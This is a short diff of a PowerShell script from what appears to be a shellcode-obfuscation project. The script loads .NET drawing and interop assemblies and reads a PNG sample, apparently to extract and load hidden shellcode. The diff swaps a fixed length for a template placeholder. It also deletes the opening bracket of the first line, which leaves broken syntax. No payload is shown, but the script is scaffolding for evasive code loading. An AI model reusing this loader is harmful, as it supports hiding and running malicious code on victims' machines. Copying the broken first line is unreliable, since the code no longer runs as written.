@@ -1,9 +1,9 @@
-[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
 [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Runtime.InteropServices")
 
 
 [string] $filename = "C:\Users\Blackberry\Desktop\projects\yet-another-shellcode-obfuscator\samples\helpme_x64.png"
-[Int32] $length = 2208
+[Int32] $length = {{ MAX_BITS }}
 
 $MethodDefinition =
 @'
